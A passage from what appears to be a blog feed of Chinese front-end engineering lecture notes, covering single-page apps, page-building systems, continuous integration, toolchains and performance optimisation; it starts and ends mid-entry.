时是会有白屏过程的，对追求极致体验的团队来说，希望能够进一步提升体验，于是就有了“单页应用（SPA）”的概念。</p><p>单页应用是把多个页面的内容实现在同一个实际页面内的技术，因为失去了页面的天然解耦，所以就要解决耦合问题。也就是说，我们要在一个“物理页面”内，通过架构设计来实现若干个“逻辑页面”。</p><p>逻辑页面应该做到独立开发和独立发布，一种思路是，每个逻辑页面一个 js，用一个 SPA 框架加载 js 文件。</p><p>从交互的角度，这并不困难，但是，这里还有一个隐性需求：保持前进后退历史。</p><p>一般来说，前进后退历史使用 URL 的 Hash 部分来控制，但是 onhashchange 事件并没有提供前进或者后退信息，目前还没有完美的解决方案，只能牺牲一部分体验。实现单页应用的逻辑页面发布需要改造发布系统，在工程上，这也是一个比较大的挑战。</p><h2 id="扩展前端新边界"><a href="#扩展前端新边界" class="headerlink" title="扩展前端新边界"></a>扩展前端新边界</h2><p>除了解决现实问题，我认为前端架构的职责还包括扩展前端的边界，所以前端架构还包含了很多 Native 开发任务：如客户端和前端结合的方案 Weex 和 React Native；如前端和图形学结合的方案 GCanvas；如前端的 3D 框架 Three.js，这些都是试图用架构的手段赋予前端新的能力的尝试。</p><p>这些具体的尝试涉及很多领域知识，我这里就不做详细介绍了，但是如果你成为了一个前端架构师，我希望你也把“拓展前端边界”当做团队的核心目标之一。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>今天我从宏观的角度介绍了前端架构相关的知识，我重点介绍了“组件化”“适配性”“单页应用”三个前端架构需要解决的核心问题，组件化在社区有很多现成的方案，我们需要做的主要工作是框架选型。适配性需要用到 CSS 的几种特性：vw 单位、viewport 规则和 media 规则，单页应用重点是逻辑页面解耦、独立开发和发布和保持前进后退历史。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>38丨综合：搭建系统</title>
      <link href="/Blog/2019/01/30/relearn_FE/38%E4%B8%A8%E7%BB%BC%E5%90%88%EF%BC%9A%E6%90%AD%E5%BB%BA%E7%B3%BB%E7%BB%9F/index/"/>
      <url>/Blog/2019/01/30/relearn_FE/38%E4%B8%A8%E7%BB%BC%E5%90%88%EF%BC%9A%E6%90%AD%E5%BB%BA%E7%B3%BB%E7%BB%9F/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>不知道你在工作中有没有遇到过这样的事情：一个运营找过来说，有一个紧急又简单的临时活动页面要做，希望打断现有的产品开发节奏临时插入。</p></blockquote><p>这类页面技术难度不高，业务上通常属于“紧急不重要”的事情。</p><p>这些需求技术上没挑战，线上存在时间短，上线时间紧又没有任何调整空间，它们往往会成为前端团队里人人都不喜欢的“垃圾需求”，谁要是接了这种需求，就只能自认倒霉。</p><p>但是，这些真的是垃圾需求吗？换个视角来看，我认为它反而是宝藏。</p><p>所谓工程师，就是为了解决这些问题而存在的岗位，我们从工程的视角来看，“大量紧急不重要的页面”，才是真正的需求，现在需求有了，我们就应该按照工程的方式，定目标、设计方案、做实施、拿结果来解决问题。这就是我们今天要讲的搭建系统。</p><h2 id="搭建系统的目标"><a href="#搭建系统的目标" class="headerlink" title="搭建系统的目标"></a>搭建系统的目标</h2><p>搭建系统的目标是解决大量的简单页面生产问题。衡量这个目标的指标应该是生产页面的数量，这部分非常的明确，你如果要做搭建系统，可以根据业务的体量和服务的范围来决定具体的指标要求。</p><h2 id="搭建系统的设计"><a href="#搭建系统的设计" class="headerlink" title="搭建系统的设计"></a>搭建系统的设计</h2><p>搭建系统设计大概有几种流派，这里我介绍几种常见的搭建系统的设计。</p><p>第一种，是模板化搭建，由前端工程师生产页面模板，再由运营提供数据来完成页面，可以用以下公式来理解：</p><blockquote><p>模板 + 数据 &#x3D; 页面</p></blockquote><p>模板化搭建是一种简单的思路，它的优点是整个系统实现简单。</p><p>第二种思路是，模块化搭建，由前端工程师生产模块，由运营把模块和数据组织成页面。</p><p>第三种思路，是数据驱动界面，这是一种比较新的思路，即数据中包含了展现自身所需要的模块相关的信息，本身决定了界面。</p><p>但是不论何种流派，都可以认为是数据、模块、模板、页面几种实体的相互作用，下面我就来详细讲解一下这几样实体。</p><h2 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h2><p>数据是用于展现界面所需要的信息。</p><p>我们按照数据用途，可以分成界面配置数据和内容数据。</p><ul><li>界面配置数据：决定了页面上颜色、尺寸、位置、图片、文字等展现形式的数据，通常是以页面为单位的配置。</li><li>内容数据：页面要展示的信息，如电商活动页面的商品信息、文章的文字信息等。</li></ul><p>按照数据来源，我们又可以分成运营人员手工填写的数据和来自 API 产生的数据。</p><ul><li>运营手工填写固定数据：运营人员依靠自己的专业技能决定的数据，可能包含线下招商信息、商品选品、文章等。</li><li>来自 API 的数据：<ul><li>固定数据，由服务端逻辑到指定存储处获取的数据；</li><li>用户相关数据，由算法系统或者服务端逻辑，根据用户信息或者用户喜好推荐的数据。</li></ul></li></ul><p>搭建系统本身是个产品，我们针对数据这个实体，要设计增、删、改、查的能力，根据我们以上的分析，搭建系统的数据部分有两个难点。</p><p>第一个难点是数据的手工编辑能力，现在一般的数据都会采用 JSON 格式，JSON 格式中有数字、字符串、数组、对象、布尔等数据类型，我们需要根据数据的格式定义为每一种类型设计编辑器。</p><p>但是仅仅是基本类型还不够，我们实际开发中，还需要跟实际业务结合来设计编辑器，下面，我就把我在之前的工作中设计的数据编辑器列一下。</p><ul><li>整数：整数编辑器，可用 HTML 原生输入框 &lt;input type&#x3D;number min&#x3D;1 max&#x3D;100/&gt;实现。</li><li>数字：数字编辑器，可用&lt;input type&#x3D;number min&#x3D;1.0 max&#x3D;100.0/&gt;实现</li><li>字符串：字符串编辑器，可用&lt;input /&gt;实现。</li><li>URL：URL 编辑器，可用&lt;input /&gt;配合格式校验。</li><li>图片：图片编辑器，需要自研图片上传功能。固定字段</li><li>对象：对象和字段编辑器，可用多个&lt;input /&gt;和&lt;label&gt;实现。</li><li>布尔型：开关，可用&lt;select&gt;或者自研组件实现。自由字段对象：需要自研 KV 输入组件。</li><li>数组：需要自研列表组件实现。</li><li>对象数组：需要自研表格组件或者列表组件实现。</li><li>矩形区域：需要自研区域选择组件。</li></ul><p>这里要注意 JSON 是一个级联的格式，所以对象、数组中很可能需要插入各种不同的数据类型的编辑器，这部分技术上有一定挑战。此外，实践中，对象数组很多时候都来自 Excel 数据，Excel 导入也是非常重要的。</p><p>第二个难点则是跟服务端 API 的对接，对于服务端系统统一性较好的公司，这不是什么难事，对服务端系统比较奔放的公司，如果服务端 API 调用方式不统一，就非常麻烦了。这一块只能根据实际情况见招拆招，我这里没办法详细介绍，</p><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>模板可以简单得理解成挖了许多坑的页面，它一般是由前端工程师来生产的一种实体。与数据之间的连接是数据的格式，对 JSON 格式来说，JSON Schema 是社区接受度较高的一个方案。</p><p>最简单的模板可以用字符串模板来设计，复杂一点的模板则可以由 JavaScript 进行渲染，通过约定全局变量名称或者约定调用函数入口做到把数据传递给模板，你可以根据实际需求复杂程度选择合适的方案。</p><p>需要注意，在产品设计上，模板可不是“增、删、改、查”那么简单，考虑到实际工程需要，模板必须是版本化的，也就是说，前端每发布一个模板，都需要永久性存储一条记录，并且产品设计上必须保持可以回滚，这样，一旦线上发现问题，可以迅速回滚到一个可工作的版本，有效降低不可用时长。</p><p>此外，模板设计还有批量更新的需求，一些运营活动可能包含数百个页面，它们使用同一套模板，产品设计上必须要注意提供批量更新机制。</p><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p>模块跟模板非常相似，但是从产品的角度，模块是可组合的。跟模板相似的部分如数据连接、版本化发布、批量更新等，这里就不再赘述。</p><p>模块化搭建有额外的技术难点，就是可拖拽的模块编辑器，移动端搭建布局相对简单，可以通过简单的自上而下布局和拖拽改变位置来实现。</p><p>桌面的模块拖拽比较复杂，一般都会采用一些变通的思路简化设计，如提供几种固定的布局模板，提供布局容器，或者采用纯绝对定位布局。</p><p>在一些产品设计中，会先用模块拼成模板，再指定数据源，这种模式中的“模块”，我们认为是一种开发模板的技术方案，跟我们此处讲的产品上的模块概念不同。因为在我们的认知中，模板应该是由前端工程师产生的，具有复用性的一种实体。</p><h2 id="页面"><a href="#页面" class="headerlink" title="页面"></a>页面</h2><p>不论是模板搭建还是模块搭建，我们的最终生产的目标都是页面。页面同样需要版本化发布，便于回滚。</p><p>页面部分实现的难点是跟发布系统的结合，在我们前面讲的所有产品实体中，模板、模块、数据都是存储在搭建系统本身的，但是页面不一样，页面必须要提供线上服务，所以页面是要发布到线上生产环境的。</p><p>如我们上一课讲的，假设前端持续集成系统有校验规则，页面也必须经过这个过程。</p><p>在我之前的工作中，是通过自建静态 Web 服务器 +CDN 回源的方式来支撑搭建系统的线上应用的。</p><p>因为服务器上只发布静态内容，并且有 CDN 挡住用户流量，所以只需要少量几台线上机器即可。</p><h2 id="搭建系统的实施"><a href="#搭建系统的实施" class="headerlink" title="搭建系统的实施"></a>搭建系统的实施</h2><p>在我工作的实践中，搭建系统的实施可以说是所有系统中最容易的了，对多数公司来说搭建系统是一种刚性需求，只要完成了产品开发，立刻会有大量的用户。</p><p>所以只要正确识别了需求，搭建系统的推行几乎完全不需要担心。</p><h2 id="搭建系统的监控"><a href="#搭建系统的监控" class="headerlink" title="搭建系统的监控"></a>搭建系统的监控</h2><p>作为一个工具型技术产品，搭建系统同样会产生大量有价值的数据，搭建系统的用户访问和生产页面数量是衡量自身的重要指标。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>37丨综合：持续集成</title>
      <link href="/Blog/2019/01/30/relearn_FE/37%E4%B8%A8%E7%BB%BC%E5%90%88%EF%BC%9A%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/index/"/>
      <url>/Blog/2019/01/30/relearn_FE/37%E4%B8%A8%E7%BB%BC%E5%90%88%EF%BC%9A%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>持续集成是近现代软件工程中的一个非常重要的概念。它是指在软件开发过程中，以定期或者实时的方式，集成所有人的工作成果，做统一的构建和测试。</p></blockquote><p>与持续集成相对的做法是：独立开发各个模块，在软件开发的最终阶段才做集成。持续集成的优势是及早处理集成阶段的问题，使软件质量和开发进度可控。</p><p>现在持续集成还有升级版本：持续交付和持续部署，这些因为需要更为完善的基础设施，目前很少有公司前端团队可以用上，我们暂且不谈。</p><p>传统的持续集成概念诞生于桌面客户端开发，在 Web 前端领域，由于技术和产品形态的差别，我们需要构建的持续集成体系也有一些区别。</p><h2 id="持续集成总论"><a href="#持续集成总论" class="headerlink" title="持续集成总论"></a>持续集成总论</h2><p>传统软件的持续集成主要有以下措施。</p><ul><li>daily build：每日构建，开发者每天提交代码到代码仓库，构建一个可运行的版本。</li><li>build verification test（BVT）：构建验证测试，每日构建版本出来后，运行一组自动化的测试用例，保证基本功能可用。</li></ul><p>对于前端来说，有一些现实的区别：</p><ul><li>前端代码按页面自然解耦，大部分页面都是单人开发；</li><li>前端构建逻辑简单，一般开发阶段都保证构建成功，不需要构建；</li><li>前端代码一般用于开发界面，测试自动化成本极高；</li><li>前端页面跳转，是基于 url，没有明确的产品边界。</li></ul><p>基于以上分析，传统的持续集成方案放在前端，要么不需要，要么不适用，要么实施成本高，因此我们不能套用传统的持续集成理论，而需要重新思考前端领域的持续集成体系。</p><h2 id="持续集成的目标"><a href="#持续集成的目标" class="headerlink" title="持续集成的目标"></a>持续集成的目标</h2><p>前面我们已经分析过，每日构建不需要，前端构建验证测试成本过高难以实施，那么我们是不是可以有一些代替的措施呢？</p><p>首先我们要确定前端持续集成的目标，我们回到持续集成的根本理念，一是要及早集成代码形成可测试的版本，二是通过一定的测试来验证提交的代码的有效性。</p><h2 id="持续集成的方案"><a href="#持续集成的方案" class="headerlink" title="持续集成的方案"></a>持续集成的方案</h2><p>我们进一步思考，前端持续集成如何完成这两个目标呢？</p><p>前端代码不需要构建，或者说只需要单页面构建，但是页面与页面之间的跳转是用 url 构成的，所以我们的可测试的版本，不可能通过“构建”来获得。</p><p>我们只能通过“发布”来获得一个前端代码的可执行版本，在传统语境中，“发布”的目标是线上生产环境，这显然不行。于是，我们就需要一个预览环境，来做一种“虚拟发布”的操作。</p><p>我们再来考虑一下，为界面编写自动化测试用例成本很高，那么如何代替构建验证测试呢？</p><p>我们回忆一下，在性能一课，我有讲过，页面的性能可以通过一些自动化工具来分析，还可以通过一些数据采集方案来发现性能问题，对于预览环境前端页面，我们可以采用同样的措施。</p><p>除了基于页面结构的分析和数据采集，我们还可以扫描代码。</p><p>综上，我认为前端的持续集成的措施应该是这样的：</p><ul><li>预览环境，代替每日构建，前端每次（或指定次）提交代码到仓库都同步到预览环境，保证预览环境总是可用；</li><li>规则校验，代替构建验证测试，通过数据采集（如前面提到的性能数据）和代码扫描，保证提交的代码满足一定的质量要求。</li></ul><p>接下来，让我来详细介绍一下预览环境的设计和规则校验的设计。</p><h2 id="预览环境"><a href="#预览环境" class="headerlink" title="预览环境"></a>预览环境</h2><p>前端代码发布到线上生产环境需要有线上的机器和域名，而预览环境同样需要机器和域名，不过，只需要在公司内网即可。</p><p>所以建立预览环境的第一步就是申请机器和域名，我们需要运维协助，在预览环境的机器上部署 Web 应用服务器。</p><p>有了预览环境的机器，下一步就是建立预览环境发布机制。</p><p>有些公司使用脚本发布，有些公司使用 git hook，有些公司则使用一个 Web 应用平台，进行白屏操作，因为各个公司的发布机制千差万别，我这里没办法讲解具体的方案。这里我建议，预览环境的机器发布流程应该跟线上发布保持一致，这样可以最大程度降低成本和降低心智负担。</p><p>预览环境的部署和发布机制建立是最基本的需求，在实际应用中，情况要复杂的多，可能需要多个预览环境同时存在。</p><p>比如，测试工程师可能要求一个相对稳定的环境来测试，这是一个合理的诉求，比如，全公司大部分业务都可能依赖登录页面，一旦登录页面在频繁发布导致一些预览环境的故障，可能全公司都没办法工作了。</p><p>又比如，当服务端工程师联调时，会希望前端的预览环境跟服务端的预览环境对接，而当服务端的代码部署到线上生产环境后，可能又需要前端的预览环境跟服务端线上环境对接。</p><p>这些问题都是我曾经遇到过的非常现实的问题，如果今天回过头来设计，我认为应该设计一套带参数和版本号的预览环境，为测试提供特定版本的预览环境，用参数解决那些跟服务端 API 对接问题，但是任何系统都不可能从一开始就设计完善，所以，建议你把重心放到建立预览环境的基本需求上来。</p><h2 id="规则校验"><a href="#规则校验" class="headerlink" title="规则校验"></a>规则校验</h2><p>接下来我们讲讲规则校验，规则校验可以分成三种措施：</p><ul><li>页面结构扫描；</li><li>运行时数据采集；</li><li>代码扫描。</li></ul><p>页面结构扫描可以使用无头浏览器（如 phantomjs）配合一些 JavaScript 代码编写的规则来完成。</p><p>运行时数据采集，可以通过在页面插入公共 js 文件的方式来完成，最基本的是用 Performance API 来采集性能数据，用 window.onerror 来采集 js 错误。</p><p>代码扫描，社区有一些现成的方案，比如 JSHint，你可以根据实际需要，选择社区方案或者自研。</p><h2 id="持续集成的实施"><a href="#持续集成的实施" class="headerlink" title="持续集成的实施"></a>持续集成的实施</h2><p>持续集成的实施，是必须严格做到自动化和制度化的。我们可以通过上节课讲的工具来完成持续集成。其它部分，都可以通过工具和制度来完成，这里需要重点讲的是规则校验中的规则部分。</p><p>我们刚刚讲解的规则校验仅仅是搭建好了平台，而规则本身，我们需要先形成一个共识，然后在前端团队内部形成一定的更新机制。</p><p>这里，我建议用 issue 的方式来管理规则的提案，可以在周会或者月会上讨论，充分保证整个团队对校验规则的一致意见。</p><p>这里，我们必须警惕三种错误：</p><ul><li>少数人拍脑袋决定校验规则；</li><li>一成不变的校验规则；</li><li>频繁无规律变化的校验规则。</li></ul><p>只有经过民主讨论、定期更新的校验规则，才能在团队中起到积极作用。校验规则决定了整个前端团队的开发体验，所以必须非常慎重。</p><h2 id="持续集成的结果"><a href="#持续集成的结果" class="headerlink" title="持续集成的结果"></a>持续集成的结果</h2><p>持续集成机制的建立本身就可以视为一种结果，它能够让整个团队的代码质量有一个基本的保障，提前发现问题，统一代码风格，从而带来开发体验和效率的提升。</p><p>此外，持续集成的结果也能够以数据的方式呈现出整个开发团队的健康状态，这是管理者会非常关注的一个点。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>今天我们讲解了持续集成，持续集成这个概念最早来自桌面客户端软件开发，应用到前端领域，会有一定的变化。这里我提出了一个预览环境 + 规则校验的前端持续集成体系。</p><p>预览环境需要申请机器和域名、部署和建立发布机制，规则校验有三种方法：结构扫描、数据采集和代码扫描。</p><p>持续集成的实施需要重点关注校验规则部分，要建立一个民主讨论、定期更新的校验规则。持续集成机制的建立就是其结果本身，此外，系统中产生的数据也可以有一定管理价值。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>36丨综合：工具链</title>
      <link href="/Blog/2019/01/30/relearn_FE/36%E4%B8%A8%E7%BB%BC%E5%90%88%EF%BC%9A%E5%B7%A5%E5%85%B7%E9%93%BE/index/"/>
      <url>/Blog/2019/01/30/relearn_FE/36%E4%B8%A8%E7%BB%BC%E5%90%88%EF%BC%9A%E5%B7%A5%E5%85%B7%E9%93%BE/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>古语云：“工欲善其事，必先利其器”，程序员群体对工具的爱好和重视是一个悠久的传统。简单趁手的工具是程序员开发的好帮手。</p></blockquote><p>但是在工程方面，工具不仅仅是简单的“趁手”即可，假如一个团队人人都自己发明几个小工具，那么后果将会是灾难性的：同一个团队的同学无法互相配合写代码，一旦有人离职，可能某一个项目就永远无法跑起来了。</p><p>所以我们今天从工程的角度谈一谈工具体系的规划。</p><h2 id="工具总论"><a href="#工具总论" class="headerlink" title="工具总论"></a>工具总论</h2><p>跟性能不同，工具体系并非业务结果，所以我们没法用简单的数据指标来衡量工具，它的结果更多程度是一种开发体验：帮助技术团队内的同学提升效率和体验。</p><p>作为工程体系，我们考虑工具的时候同样要遵循基本规则：现状与指标、方案、实施、结果和监控。</p><p>不过，对工具而言，指标和结果都是一种“软性指标”，也就是团队的开发效率和开发体验。这里我不太推荐把开发效率和开发体验过度数据化，我的经验是：开发效率提升 n 倍永远是一种臆想或者主观论断。</p><h2 id="工具体系的目标"><a href="#工具体系的目标" class="headerlink" title="工具体系的目标"></a>工具体系的目标</h2><p>前面已经讲到，工具是为技术团队本身服务的工程体系，那么，工具的目标是什么呢？其实每一种工具的出现，必然都有一个非常具体的目标，比如 npm 帮助我们进行包管理，Yeoman 帮助我们初始化项目模板。</p><p>但是这些目标是工具的目标，不是工具体系的目标。我们做一个假设，<strong>假如你是一个前端团队的工具体系负责人，现在要你来规划团队的工具体系，你会怎么做呢？</strong></p><p>如果你到社区找了一大堆工具，并且把它们要解决的问题都罗列出来，作为工具体系的目标，那就完全走上了错误的道路。</p><p>实际上，在考虑具体的工具之前，我们应该解决工具体系的“元问题”，即：我们对工具本身的要求是什么？</p><p><strong>考虑到工程行为都是团队合作，我们对工具最基本的要求就是：版本一致。</strong></p><p>只有整个团队的工具版本一致，至少要做到避免大版本差异，才能做到互相接手代码时，团队成员能够正确的使用工具开发。</p><p><strong>工具体系的另一个重要需求是：避免冲突</strong>，一些工具可能互相没有干扰，比如 Yeoman 和 gulp，有一些工具则由社区设计了配合方案，比如 webpack 和 babel，有一些工具，则存在着根本性冲突，如 gulp 和 grunt。</p><p>所以，在谈及具体问题之前，我们必须要有这两个要求的解决方案。<strong>这就需要引入一个新的概念：工具链。</strong></p><p>工具链是一系列互相配合的工具，能够协作完成开发任务（注：工具链这个词最早是由 C&#x2F;C++ 程序员引入的概念，一般包含编译、链接、调试等工具）。</p><p>下面我们就来谈谈工具链的设计。</p><h2 id="工具体系的设计"><a href="#工具体系的设计" class="headerlink" title="工具体系的设计"></a>工具体系的设计</h2><p>要想设计一个工具链，首先我们需要整理一下，前端开发大约要做哪些事，下面是我的答案：</p><blockquote><p>初始化项目；<br>运行和调试；<br>测试（单元测试）；<br>发布。</p></blockquote><p>那么，一个前端项目的工具链，大约就会包含这些功能。一个典型的社区项目工具链可能就类似下面这样：</p><blockquote><p>Yeoman<br>webpack<br>ava&#x2F;nyc<br>aws-cli</p></blockquote><p>但是，这显然不够，我们还需要一种机制，保证团队使用的工具版本一致。</p><p>轻量级的做法是，在项目初始化模板中定义 npm script 并且在 npm dev-dependency 中规定它的版本号。</p><p>重量级的做法是，开发一个包装工具，在命令行中不直接使用命令，而使用包装过的命令。如在我之前的团队，使用的工具名为 def，它规定了一些命令：</p><blockquote><p>def init<br>def dev<br>def test<br>def publish</p></blockquote><p>这样，工具链的使用者只需指定工具链名称，就不需要知道项目具体使用了哪些工具，这样只需要专注自己的需求就够了。</p><p>同时，统一的命令行入口，意味着整个团队不需要互相学习工具链，就可以接手别人的项目开发。</p><p>在稍微大一些的团队内部，往往会需要不止一种开发模式，如移动开发和桌面开发，这样，所需要的工具链也不一样，因此我们需要多条工具链。</p><p>要想开发新的工具链，可以使用复制分支的方式来扩展原来的工具链。在我原来的工作中，不同的工具链被称作“套件”，每一种套件对应着一组互相配合的工具。</p><h2 id="工具体系的执行"><a href="#工具体系的执行" class="headerlink" title="工具体系的执行"></a>工具体系的执行</h2><p>因为工具体系服务的是团队内部成员，所以执行非常简单，同时，工具体系的入口是初始化项目，所以只要初始化工具在手，可以控制其它所有工具。</p><p>我们在性能的那一课里，已经讲过工程体系的执行分成三个层次：纯管理、制度化和自动化。</p><p>工具体系因为其自身特性，可以说是最容易做到自动化的一个体系了。</p><h2 id="工具体系的监控"><a href="#工具体系的监控" class="headerlink" title="工具体系的监控"></a>工具体系的监控</h2><p>工具体系的结果虽然是软性的，也不能完全不做监控。</p><p>纯粹的社区方案比较难做到监控，但是如果我们使用了前面提到的统一命令行入口包装，那么就可以做一些简单的统计工作了。</p><p>一般来说，以下指标跟开发者体验较为相关：</p><blockquote><p>调试 &#x2F; 构建次数；<br>构建平均时长；<br>使用的工具版本；<br>发布次数。</p></blockquote><p>在我之前的工作中，工具团队曾经从构建平均时长数据中发现构建效率问题，对 webpack 做了大量深度优化来改善开发体验。</p><p>同时，工具的相关数据还能够帮助发现一些问题，比如某个项目频繁发布，可能说明它风险很高。工具的相关数据还能帮我们发现老旧的工具，如果某个套件使用频率极低，则可以考虑把它下线。</p><p>总之，工具体系的监控不仅仅是衡量工具体系的好帮手，也是非常珍贵的研发数据，里面有很多可挖掘的价值。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>35丨综合：性能</title>
      <link href="/Blog/2019/01/30/relearn_FE/35%E4%B8%A8%E7%BB%BC%E5%90%88%EF%BC%9A%E6%80%A7%E8%83%BD/index/"/>
      <url>/Blog/2019/01/30/relearn_FE/35%E4%B8%A8%E7%BB%BC%E5%90%88%EF%BC%9A%E6%80%A7%E8%83%BD/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>性能是个特别有意思的话题，在我之前的工作中，从入门的初级工程师到高级别的技术专家，大家都很喜欢谈性能，我以前参与晋升评审，每年总能听到很多关于性能的晋升述职。</p></blockquote><h2 id="性能总论"><a href="#性能总论" class="headerlink" title="性能总论"></a>性能总论</h2><blockquote><p>while 循环快还是 for 循环快</p><p>|0 是不是比 Math.floor 性能好？</p></blockquote><p>网上随处可以见到一类对性能的讨论。一些新人也非常热衷此类讨论。但是实际上，它们除了让你写代码的时候纠结之外，毫无意义。</p><p>为什么这样讲呢？我想讲一个小故事。</p><p>从前有个工程师，特别注重代码细节，有一天他发现系统中的一段代码写的性能很差，因此，他用汇编重写了整段代码，执行效率足足提升了三倍。但是最后，大家发现，用户反馈性能丝毫没有提高，因为他优化的那个进程名字叫“System Idle”。</p><p>所以你看，性能优化不能只着眼于局部的代码。这里，我要提出一个我的观点：&#x2F;&#x2F;一切没有 profiling 的性能都是耍流氓&#x2F;&#x2F;。凡是真正有价值的性能优化，必定是从端到端的业务场景建立体系来考虑的。</p><p>在我的认识中，性能体系的建立可以分成以下几部分：</p><blockquote><p>现状评估和建立指标；<br>技术方案；<br>执行；<br>结果评估和监控。</p></blockquote><p>下面，我就来为你一一讲解。</p><h2 id="现状评估和建立指标"><a href="#现状评估和建立指标" class="headerlink" title="现状评估和建立指标"></a>现状评估和建立指标</h2><p>要想做好性能优化，正确地评估现状和建立指标是最关键的一步，它又往往是会被轻视的一步。</p><p>作为一个工程师，指标又要考虑两个因素。一方面，对用户来说，什么样的性能指标能更好地评估它的体验？另一方面，对公司来说，什么样的指标会影响业务价值呢？</p><p>在我公布答案之前，我希望你能思考一下，你所负责的业务，是否有前端性能指标？它是否能够满足我上面提到的两个要求？</p><p>在我之前的工作中，整个用了长达一年的时间来探索，才找到了合适的指标，并且回答好了两个问题。</p><p>性能问题可以分成很多方面，最重要的几个点是：</p><blockquote><p>页面加载性能；<br>动画与操作性能；<br>内存、电量消耗。</p></blockquote><p><strong>注意，这里我们仅仅是对“性能”两个字的分析和解读，在对大量的用户数据分析后，我们发现，其实这三部分中，“页面加载性能”跟用户的流失率有非常强的关联性，而用户流失率，正是公司业务非常看重的指标。</strong></p><p>因此，在开始阶段，我们决定把性能优化的重点放在页面加载性能上。</p><p>那么，用什么指标来衡量页面加载性能呢？最容易想到的方案是“用户平均加载时间”，事实上，我们在相当长的一段时间，也都是在使用用户平均加载时间作为性能指标。</p><p>但是，很快我们发现，这个指标有严重的问题：</p><ul><li>当加载时间低于一定数字，用户体感差别不大了，我们经过一定的研究，认为这个数字大约是 1 秒；</li><li>少数超长时间加载的用户（如 2G），会极大影响整个指标，即指标不能反映大多数用户的体验。</li></ul><p>于是，基于以上分析，我们设计了一个新的指标——秒开率，即一秒之内打开的用户占用户总量的百分比。这个指标后来逐渐推广到整个公司，甚至影响到了一些业内的其它企业，现在，谈秒开率已经是个非常自然的事情了，但是当初的设计确实走了不少弯路。</p><h2 id="技术方案"><a href="#技术方案" class="headerlink" title="技术方案"></a>技术方案</h2><p>有了指标，我们就有了优化的目标，接下来，就到了技术出场的环节了。</p><p>我们这里还是以加载过程为例，来讲解一下。</p><p>首先我们要简单分析一下，从输入 URL 后按下回车，到底发生了什么。</p><p>我们在浏览器的原理课程中，已经讲解了浏览器大致的工作过程，但是，我们必须理解几件事：</p><blockquote><p>从域名到 IP 地址，需要用 DNS 协议查询；<br>HTTP 协议是用 TCP 传输的，所以会有 TCP 建立连接过程；<br>如果使用 HTTPS，还有有 HTTPS 交换证书；<br>每个网页还有图片等请求。</p></blockquote><p>从这个分析和实际试验的结果看，网页的加载时间，不但跟体积有关系，还跟请求数有很大关系，因此，我们最终设计的技术方案大约可以这样划分：</p><p><img src="/Blog/2019/01/30/relearn_FE/35%E4%B8%A8%E7%BB%BC%E5%90%88%EF%BC%9A%E6%80%A7%E8%83%BD/index/img.png"></p><p>这里仅仅列出了性能优化的一部分技术方案，是我认为比较重要的部分，可以看到，这里涉及的并不仅仅是前端技术，有服务端、客户端、设计师团队，所以要想做好性能优化，绝对不能把自己限制在局部的视角，必须是整个业务一起考虑，才能有良好的收效。</p><h2 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h2><p>技术方案设计好了，它是不会自己变成线上页面的，所以，有了技术方案，我们只完成了一半的工作，接下来我们还需要一个执行过程。</p><p>执行也不简单，如果说方案主要靠技术，那么执行就是靠工程实施了。</p><p>根据公司的实际情况，工程实施可能有不同的程度，我把工程水平从低到高分成三个阶段：</p><blockquote><p>纯管理；<br>制度化；<br>自动化。</p></blockquote><p>纯行政管理，是由经理用纯粹的管理手段来执行方案，比如说，作为前端团队的 Leader，我可以组织会议，要求整个团队使用我们前面谈的技术方案。</p><p>但是纯行政管理有一些问题，一方面，需要的行政资源不一定有，比如我没法强制让后端团队配合我，另一方面，纯粹的管理方式，团队本身的体验并不好，也不利于团队成长，最重要的是，纯粹管理方式容易造成执行不到位。这样的执行方式多数出现在非技术岗位。</p><p>制度化执行方式是用规则代替人的命令，指定责任人，通过培训、checklist、定期 review 等具体措施来保证实施。制度化执行可以极大地减轻管理工作量，一般现代互联网公司都会采用类似的方式。但是制度化执行方式还有很大成分是依靠人的主动性的，对程序员来说，还有更好的方式：自动化。</p><p>自动化的方式是在一些重要的操作路径上设置规则，针对我们的性能优化，有两个点适合做这件事：一个是把开发好的页面发布上线，另一个是开发好的页面 URL 投放到首页等处的链接。</p><p>在我之前的工作中，我们跟测试团队配合，开发了一套页面性能打分系统，它会自动扫面页面上的可优化点，并且跟发布平台和投放平台合作，把它加入日常机制中。现在多数公司都会采用制度化和自动化结合的执行方案。</p><h2 id="结果评估和监控"><a href="#结果评估和监控" class="headerlink" title="结果评估和监控"></a>结果评估和监控</h2><p>执行完了之后，<strong>就要向老板汇报争取升职加薪了</strong>，还要有一定的结果总结，才是一个完整的工程实施，而且，凡是工程实施，肯定要有一定长效机制，不能优化完了退化，这些都要求有线上监控机制。</p><p>要想做线上监控，分两个部分：</p><ul><li>数据采集；</li><li>数据展现。</li></ul><p>数据采集部分，同样需要发布平台或者开发工具来配合，对性能数据来说，Performance API 